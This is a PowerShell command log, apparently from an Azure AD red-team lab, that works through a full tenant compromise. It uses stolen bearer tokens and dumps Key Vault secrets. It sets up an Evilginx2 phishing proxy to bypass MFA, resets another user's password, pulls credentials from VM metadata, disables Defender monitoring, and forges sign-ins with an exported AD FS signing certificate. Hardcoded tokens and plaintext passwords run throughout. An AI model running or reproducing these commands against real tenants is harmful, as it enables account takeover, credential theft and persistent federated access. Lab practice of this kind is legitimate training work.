$keyvaultToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NDI0MjYzMjksIm5iZiI6MTY0MjQyNjMyOSwiZXhwIjoxNjQyNTEzMDI5LCJhaW8iOiJFMlpnWUhoL1hKNXJJK2VsclhmbUNqNk5ZcnpOQndBPSIsImFwcGlkIjoiMmU5MWE0ZmUtYTBmMi00NmVlLTgyMTQtZmEyZmY2YWE5YWJjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0djZra1M3eW9PNUdnaFQ2TF9hcW1yeHdBQUEuIiwic3ViIjoiMzBlNjc3MjctYThiOC00OGQ5LTgzMDMtZjI0NjlkZjk3Y2IyIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiWkxEWF9zWmtKRWlGNk9INlB0b0tBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9SZXNlYXJjaC9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy92YXVsdGZyb250ZW5kIn0.rBFF3Pgz4dG8zomI7bL91BdfOCHNU8YTFkXjoSYzTV5AbtDEe-lZUCfU2HCd8CiF52fJ0GSXknWBCfY5GlMr114bgJTzzgyX3cFQPEex0cSzYxAmAJr3Q0r9_rTP0Yj5i3mUelfK2DwWIjTb99LwQnMWNjPKTkU2hjF5SU8Yq1JaopMAbkYdklr3eA641_fu8HMFTjzZ5kLFiTSWXC_-F0xPUVFNE8tS0SqTJNjZscKud601yPb1QlDVeAr6UmUw2LshlNeefgbeP2qajsS4oTt_l9up-wbA97hPK8YQusteQBNcuBm4hgRgW2yFAr1Ac9nxG9oBb0CelVuiJTV3pA'
$client_id = '2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc'
# grab the ARM token with https://management.azure.com&api-verison=2017-09-01"
$AccessToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY0MjM2NjMyMCwibmJmIjoxNjQyMzY2MzIwLCJleHAiOjE2NDI0NTMwMjAsImFpbyI6IkUyWmdZQ2haOC9QUmMvZUo1c1lmdWxmVlhXVXJCUUE9IiwiYXBwaWQiOiIyZTkxYTRmZS1hMGYyLTQ2ZWUtODIxNC1mYTJmZjZhYTlhYmMiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiIzMGU2NzcyNy1hOGI4LTQ4ZDktODMwMy1mMjQ2OWRmOTdjYjIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHY2a2tTN3lvTzVHZ2hUNkxfYXFtcnh3QUFBLiIsInN1YiI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInV0aSI6Im9lRzFueWVXTUVTTnNTSE5aVWhHQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvUmVzZWFyY2gvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvdmF1bHRmcm9udGVuZCIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.gEyy0PhZ8Wo6RfD0WxNt3mTqugq8gWrQfSHuZvFHGf9n2KM8z32ETm8WlXEmtKlI4h1VFlZ1_2c8AnmnKmw02Sh9OTSvVUIhbTaSbZJhoydpmxtHPJScjn4XbBAF0wbSKTqlPTCO2n-cl7J3Bc6IvdZgsAAvO8dTPZDNNYEovwCiCuJmqpfNUxZbLePnsBMFmlCy4k2pUcmQy0EqJf43zpn7OSUz-KRtVaiaWQXa1perUoZNz0m_hJKoqstmHjDENB6bCxCHQlE1VH8a41ons2OEgXDAITjg8E1wP_vghBiLcKTsd50W7ylB0tpJDvylCcPNb_eRZ1NVlxhaUwO_Jg'
Connect-AzAccount -AccessToken $AccessToken -AccountId $client_id -KeyVaultAccessToken $keyvaultToken
# Now see what is in there
Get-AzKeyVault
# If there is nothing in there, then you dont' have permissions or didn't use teh right creds!
# for each vault you find start enumerating
Get-AzKeyVaultSecret -VaultName ResearchKeyVault
# for each name in there, pull the secret
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
# username: kathynschaefer@defcorphq.onmicrosoft.com ; password: Kathy@3698TEST$#*!@#
# when you find stuff, you can pivot whereever you want
$creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', (ConvertTo-SecureString 'Kathy@3698TEST$#*!@#' -AsPlainText -Force))
Connect-AzAccount -Credential $creds
# winner, we are in! Start enumeration again
Get-AzResource
# there are two items. One is a VMa nd one is a monitor agent. Let's go after the VM
$resourceId = (Get-AzResource | ?{$_.Name -eq 'jumpvm'}).ResourceId
# what are the roles for the VM?
Get-AzRoleAssignment -Scope $resourceId
# says kathy is a reader, but there are other roles too. Let's enumerate to see what each of them do
Get-AzRoleAssignment -Scope $resourceId | %{ GEt-AzRoleDefinition -name $_.RoleDefinitionName | select Name,Description,Actions -ExpandProperty actions}
# So it looks like the "Virtual Machine Command Executor" can run commands. Let's run that down. The DisplayName is "VM Admins", who is a part of that?
Get-AzADGroup -DisplayName 'VM Admins'
# Okay, who is in the group?
Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select UserPrincipalName
# Okay, that is a shit-ton. We can use the graph api to get all the details on each one to grab groups and roles
$Token = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select UserPrincipalName | %{ $user = $_.UserPrincipalName
$URI = "https://graph.microsoft.com/v1.0/users/$user/memberof"
$RequestParams = @{
   Method = 'GET'
   Uri = $URI
   Headers = @{
    'Authorization' = "Bearer $Token"
    }
}
(Invoke-RestMethod @RequestParams).value
}
# It looks like they are in the "Control Group". Let's get more information on that. Grab the id field
$id = 'e1e26d93-163e-42a2-a46e-1b7d52626395'
# However, we need the AzureAD module now 
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -Credential $creds
Get-AzureADMSAdministrativeUnit -Id $id
# yup, that is it. Now who is a member?
Get-AzureADMSAdministrativeUnitMember -Id $id
# It shows VM Admins is in the group. Let's see the scope
Get-AzureADMSScopedRoleMembership -Id $id | fl *
# so it says "Roy G Cain" is in this role. Okay. Grab that role ID and lets see what he does in AD
Get-AzureADDirectoryRole -ObjectId 5b3935ed-b52d-4080-8b05-3a1832194d3a
# And he is an authentication Admin. Okay, let's grab his Id and check him out
Get-AzureADUser -ObjectId (Get-AzureADMSScopedRoleMembership -Id $id).RoleMemberInfo.Id | fl *
# and we snagged an email. Time to go phishing again!

## Phishing using Evilginx2 and Technitium DNS
# run this from a powershell and NOT ISE
evilginx2.exe -p C:\AzAD\Tools\evilginx2\phishlets
# inside that powershell, configure a few things:
: config domain artillery.corp
# this should be YOUR IP address
: config ip 172.16.151.170
: phishlets hostname o365 login.artillery.corp
: phishlets get-hosts o365
# Now you need to set up DNS so that the phishing URLs point to us
# SEt up whatever you want wherever. It just has to point back to us so it does the reverse lookup!
# Once DNS is ready, we can start
: phishlets enable o365
# It should error for a lack of certicates. Let's make some and put in that directory it needs
Copy-Item C:\Users\studentuser170\.evilginx\crt\ca.crt C:\Users\studentuser170\.evilginx\crt\login.artillery.corp\o365.crt
Copy-Item C:\Users\studentuser170\.evilginx\crt\private.key C:\Users\studentuser170\.evilginx\crt\login.artillery.corp\o365.key
# now create a lure
: lures create o365
: lures get-url 0
# Now we have a link. Time to fish some more! Send the email
# After waiting for the user, we got a hit. This works even if MFA is enabled!
# So now we can attempt to login with the new user
$creds = New-Object System.Management.Automation.PSCredential('roygcain@defcorphq.onmicrosoft.com', (ConvertTo-SecureString '$7cur3ceS@!nMoka1679@111' -AsPlainText -Force))
Connect-AzureAD -Credential $creds
# since roy has permissions over the VMContributor170 user, reset the VMContributor170 password
(Get-AzureADUser -All $true | ?{ $_.UserPrincipalName -eq 'VMContributor170@defcorphq.onmicrosoft.com'}).ObjectId | Set-AzureADUserPassword -Password ("VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText -Force) -Verbose
# so if that succeeds, disconnect and go back to AzPowershell
Disconnect-AzureAD
$creds = New-Object System.Management.Automation.PSCredential('VMContributor170@defcorphq.onmicrosoft.com', (ConvertTo-SecureString 'VM@Contributor@123@321' -AsPlainText -Force))
Connect-AzAccount -Credential $creds
# Now start enumerating that VM
Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | fl *
# check IPs
$interface = Get-AzVM -Name $name -ResourceGroupName $resourceGroup | select -ExpandProperty NetworkProfile
Get-AZVM -Name jumpvm -ResourceGroupName RESEARCH | select -ExpandProperty NetworkProfile
$interfaceName = Split-Path -Path $interface.NetworkInterfaces.Id -Leaf
Split-Path -Path (Get-AzNetworkInterface -Name $interfaceName).IpConfigurations.PublicIpAddress.Id -Leaf
# Okay, we can get to it. Let's add a user like we did on the last one
Invoke-AzVMRunCommand -VMName $name -ResourceGroupName $resourceGroup -CommandId 'RunPowerShellScript' -ScriptPath C:\Users\studentuser170\Documents\vmUserAdd.ps1 -Verbose
$creds = New-Object System.Management.Automation.PSCredential('artilleryRed', $passwd)
$jumpsess = New-PSSession -ComputerName $ipAddress -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $jumpsess
whoami; hostname
# GOld!
# now see if we have any user data stored that we can manipulate
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
# Yes, we got creds for samcgray!
exit
$pass = ConvertTo-SecureString '$7cur7gr@yQamu5913@092' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('samcgray@defcorphq.onmicrosoft.com', $pass)
Connect-AzAccount -Credential $creds




## AppID has permission to add a secret in the vault
$appid = "62e44426-5c46-4e3c-8a89-f461d5d586f2"
$AccessToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NDI0NTM0NTQsIm5iZiI6MTY0MjQ1MzQ1NCwiZXhwIjoxNjQyNTQwMTU0LCJhaW8iOiJFMlpnWUNpYjhmM1Y5Q2YvanVobld3UXNZM1dxQWdBPSIsImFwcGlkIjoiNjJlNDQ0MjYtNWM0Ni00ZTNjLThhODktZjQ2MWQ1ZDU4NmYyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRpWkU1R0pHWER4T2lvbjBZZFhWaHZKd0FBQS4iLCJzdWIiOiJlYTRjM2MxNy04YTVkLTRlMWYtOTU3Ny1iMjlkZmZmMDczMGMiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJvVkgzWHhkcDcweUhEaEdFWkNEakFBIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0lUL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL3Byb2Nlc3NmaWxlIiwieG1zX3RjZHQiOjE2MTUzNzU2Mjl9.Xy4SIZRKTx_2logVCNlAFA2KYDS69gbkDbXT0mL1qMe8UmUETTXiFMgzpjWYxul6Ul2768LMX2UdMymmGNv90wu8Th1pP9z3ouR7q-EDGMohYqZ23k9Vz-GANX8HKX77yGqXrX2sY82Hjz-ct4JM9XHE0WTVFpIpOg93_UxAd2risClmF2F2BGgeNwbjTbwYwdXn6zgUAnP-l1dqSGDyO142M5_meVQP-z8Sc-iJ_K1qZb-O5m5BJOW7tEgdU4zPIQsM6Pucb1Wu2DQA9XfqGmWN2_-9Ha87lK9jUHXXmby6XxrVj9SlF665cl-Ggzcifax-xtfDMYpnJuK-yDvE2g'
$graphtoken = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6IkVIUGg0RmItdDVlckk2dFM4d2ljYXMtUXlkMEwydTU5dEUxcXg4RWY2N0EiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY0MjQ1MzQ1NSwibmJmIjoxNjQyNDUzNDU1LCJleHAiOjE2NDI1NDAxNTUsImFpbyI6IkUyWmdZR2cxaUs3NEUzS0xPWlR0NkxkSzI0YUhBQT09IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiNDJneWtJVFF1a1NyTXY4V0VhMEtBQSIsInZlciI6IjEuMCIsIndpZHMiOlsiMDk5N2ExZDAtMGQxZC00YWNiLWI0MDgtZDVjYTczMTIxZTkwIl0sInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.MRktan7GqHKYTiDVhJ8cTu2RG1lh68qozyryhDttemxV2ranTmrNtT6xgJPk_5b_QP7TxBaZpLRCjqmKbVPktAaim_Y0D9p7KlBSJ9fzfE-PABVOQ4nVKN167BJpCU-3zfLuGQoG5IRf09Lskx2bXNjrPqZ464MLsBwREN-ZbCB7dOtcvQYDvUp9QWHXHx-Hm1PwehX0QwbnHfx4bevYB3nE6j4mbbgC8Bc51hT2p-ZIV-tUUTQCcaxS9Au2tNWXvMweDIoaoUejyc6ifDZMX81WKgyqyb7B9xT0jQFJ7jUYYjVU512EFzcEjqCPzOX5JICvxvF73Ud0U_RrrCk-iA'
Connect-AzAccount -AccessToken $AccessToken -AccountId $appid -GraphAccessToken $graphtoken
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
# that should give a secret! save it 
$appid = 'f072c4a6-b440-40de-983f-a7f3bd317d8f'
$secret = '.vY7Q~O5QgSYHaWopo-VYkDNxKkDfbCnBVxKu'
Import-Module AzureAD.psd1
$User = "test@defcorphq.onmicrosoft.com"
$pass = "SuperVeryEasytoGuessPAssw0rd!@222"
$creds = New-Object System.Management.Automation.PSCredential($User, $(ConvertTo-SecureString $pass -AsPlainText -Force))
Connect-AzureAD -Credential $creds
Get-AzureADServicePrincipal -All $true | ?{ $_.AppId -eq $appid} | fl
# so it says this is a SPN for a Managed Identity called "processfile"
# Grab the TenantID from AppOwnerTenantId
$tenantId = '2d50cb29-5f7b-48a4-87ce-fe75a941adb6'
# Use the creds from the key vault you found earlier to connect.
$pass = $secret
$User = $appid
$creds = New-Object System.Management.Automation.PSCredential($User, $(ConvertTo-SecureString $pass -AsPlainText -Force))
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant $tenantId
Get-AzResource
# And we have access to another key vault. Cool beans
$name = (Get-AzResource).Name
Get-AzKeyVaultSecret -VaultName $name
Get-AzKeyVaultSecret -VaultName $name -Name (Get-AzKeyVaultSecret -VaultName $name).Name -AsPlainText
# And we got username: DavidDHenriques@defcorphq.onmicrosoft.com ; password: David@Ka%%ya72&*FG9313gs49
# Let's pivot
$pass = 'David@Ka%%ya72&*FG9313gs49'
$User = 'DavidDHenriques@defcorphq.onmicrosoft.com'
$creds = New-Object System.Management.Automation.PSCredential($User, $(ConvertTo-SecureString $pass -AsPlainText -Force))
Connect-AzAccount -Credential $creds
# blocked. Damn it. Let's try the browser
# Go to portal.azure.com
# Nope, blocked too. However, he was in teh "Mobile Devices" group, let's change our user agent
# log in again and we get in!
# Navigate around and we find something good in the "StagingEnv" area
# there are hard-coded creds in the template. Stupid idiots
# thomasebarlow@defcorpit.onmicrosoft.com: %%Thomas^Da@asyu0(@*&13563
# we can use these creds to log on to the portal, but we don't have access to much of anything. However, we are part of a dynamic group membership!
# it has a rule that the otherEmails property needs to contain "vendor" in the email and it is a guest account. Then it will be part of the ITOPS group.
# Let's invite one of our users we control to be a guest.
# Now let's go back to our user and see what we got. Ensure we use the same tenantId that Thomas is in!
exit
Connect-AzureAD -Credential $creds -TenantId b6e0615d-2c17-46b3-922c-491c91624acd
# grab the Object ID from the portal for my user
$objectId = '65f2152b-cbc5-4f11-89c5-2b748355d7c0'
Set-AzureADUser -ObjectId $objectId -OtherMails vendor170@defcorpextcontractors.onmicrosoft.com -Verbose
# now we should be part of the ITOps group in a different tenant!



# See if we have user data available for this user
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
# Okay, so if it has data, we can modify it to execute what we want!
$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
$AccessToken = (Get-AzAccessToken).Token
$URI = "https://management.azure.com/subscriptions/$resourceGroup/providers/Microsoft.Compute/VirtualMachines/jumpvm?api-version=2021-07-01"
$body = @( 
   @{
      location = "Germany West Central"
      properties = @{
        userData = "$data"
      }
    }
) | ConvertTo-Json -Depth 4
$headers = @{
   Authorization = "Bearer $AccessToken"
}


## So using the creds from Lauren, we can logon to github and see what we can do. Apparently, this allows us to modify the source code and 
## update the code to get us the accessToken!
$AccessToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY0MzQ3ODkwMCwibmJmIjoxNjQzNDc4OTAwLCJleHAiOjE2NDM1NjU2MDAsImFpbyI6IkUyWmdZTGhuSXZVbDIrMlo0Sm5vM2ViWDdwVnZBQUE9IiwiYXBwaWQiOiI5NWY0MGVlYS02NjUzLTRlMTEtYjU0NS1kOWMyZjVmOTBhMjkiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiJlNjViNzkxMi01YjdlLTRkY2ItYTMyZC0wMWM3ZDQ3OTMwMWUiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHVvTzlKVlRaaEZPdFVYWnd2WDVDaWx3QUFBLiIsInN1YiI6ImU2NWI3OTEyLTViN2UtNGRjYi1hMzJkLTAxYzdkNDc5MzAxZSIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInV0aSI6IkFfS3NFR19BeFVxclA1Qzd2UkVjQVEiLCJ2ZXIiOiIxLjAiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvRmluYW5jZS9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9TaW1wbGVBcHBzIiwieG1zX3RjZHQiOjE2MTUzNzU2Mjl9.idYEHDCA4iRhGwyQ9PvndtXkx749pPntf0eOYlexMIMvEzApT_JM2_zBr77nS_KUHCbH42BSDgKdPHRnzsNF4RDpQaDRlYI7XxRiwPDRP_6_zwFFDz0VOsg5I1kIZdAOUkS6-h001H36XNzLKHeRkP9-dVxNONoWFxSEVaabg6rEdCKn_KuB8W5Hs2l2UL9fcdW7K4Gl36hf7Z_MDfbbaERB7mNZsVIhBUDptmHgrxtoCFWwjD2g6-f4b8cejDifaEfgbFsXK9AOZL3aPb2NBIrwTUt3xJ3UmbJEKG5YAa25yu4Z82RWZDM13V4m7HlflouLLbWJeH5i1cB78r1BcA'
$client_id = '95f40eea-6653-4e11-b545-d9c2f5f90a29'
Connect-AzAccount -AccessToken $AccessToken -AccountId $client_id
# okay, we are in. What resources do we get?
Get-AzResourceGroup
# we got one resource, let's dig into it
$resourceGroup = "SAP"
$Dep = Get-AzResourceGroupDeployment -ResourceGroupName $resourceGroup
# there is a template with passwords. Let's save it
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName $resourceGroup -DeploymentName $Dep.DeploymentName
# It was saved, let's extract the creds
(cat C:\Users\studentuser170\Documents\repo\SimpleApps\Student170\stevencking_defcorphq.onmicrosoft.com.sapsrv.json | ConvertFrom-Json | select -ExpandProperty Resources).resources.Properties.Settings.CommandToExecute
# okay, we got credentials. Let's save them and use them
Disconnect-AzAccount
# Login with what was in the creds
# Just like before, see what we got now
$res = Get-AzResource
# So we have access to a storage account, do we have access to a container?
Get-AzStorageContainer -Context (Get-AzStorageAccount -Name $res.Name -ResourceGroupName $res.ResourceGroupName).Context
# denied! So let's try using the storage Explorer and see what we get
# After login, it appears we have two blobs: client and secret
# we saw client before when we got lauren's creds. Now we see secret that has id_rsa. Grab that!
# the readme says it is the key for jennifer
# copy the key to a .ssh directory and let's try it out
mkdir C:\Users\studentuser170\.ssh
copy C:\Users\studentuser170\Downloads\id_rsa C:\Users\studentuser170\.ssh\id_rsa
cd C:\Users\studentuser170\Documents
# must run the next command inside a non-ISE window since it has internal prompts
ssh -T git@github.com
# 
git clone git@github.com:DefCorp/CreateUsers.git
cd CreateUsers
gc README.md
# and we just follow the directions. 
mkdir student170
cd student170
copy ..\Example\user.json user.json
notepad user.json
git add .
git commit -m 'Update'
git push
# Now if the code was right, it creates a user on the App
# So now we have student170 with password Stud170Password@123 available to use.
# Now let's use that JumpVM and see what we can see
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
$password = ConvertTo-SecureString 'Stud170Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student170@defcorphq.onmicrosoft.com',$password)
$tenantId = '2d50cb29-5f7b-48a4-87ce-fe75a941adb6'
Connect-AzureAD -Credential $creds -TenantId $tenantId
# Now see if there are any proxy-configured applications
Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID} catch{}}
# So there is one. Get the Service Principal for it
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq 'Finance Management System'}
# Use that objectID to find users and groups allowed access
. C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1
$objectId = 'ec350d24-e4e4-4033-ad3f-bf60395f0362'
Get-ApplicationProxyAssignedUsersAndGroups -ObjectId $objectId
# if you have access to any of these users, you can go after the App. If not, these are a high priority of users to attack.
# After going after the app and getting a reverse shell, I got mimikatz to run and it dumped SNMP creds
# adfsadmin@deffin.com:UserToCreateandManageF3deration!
# So now we have an on-prem admin user. Let's attack it!
# The only problem here is you need the IP address of the AD FS server. Let's assume it is 172.16.4.41
$password = ConvertTo-SecureString 'UserToCreateandManageF3deration!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('adfsadmin',$password)
$adfs = New-PSSession -ComputerName 172.16.4.41 -Credential $creds
Enter-PSSession $adfs
# Now we are on the box. Let's extract the Token-signing Certificate
Set-MpPreference -DisableRealtimeMonitoring $true
exit
Copy-Item -ToSession $adfs -Path C:\AzAD\Tools\AADInternals.0.4.5.zip -Destination C:\Users\adfsadmin\Documents
Enter-PSSession $adfs
Expand-Archive C:\Users\adfsadmin\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\adfsadmin\Documents\AADInternals
Export-AADIntADFSSigningCertificate
# For this to work, you need the ImmutableID
exit
Import-Module C:\AzAD\Tools\ADModule\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AzAD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
[System.Conver]::ToBase64String((Get-ADUser -Identity onpremuser -Server 172.16.4.1 -Credential $creds | select -ExpandProperty ObjectGUID).tobytearray())
Enter-PSSession $adfs
# Now we can comprimise it
Open-AADIntOffice365Portal -ImmutableID <id_from_above> -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\Users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
exit
Copy-Item -FromSession $adfs -Path C:\Users\adfsadmin\AppData\Local\Temp\tmp9E0F.tmp.html -Destination C:\AzAD\Tools
# Now open that file in your Chrome Browser
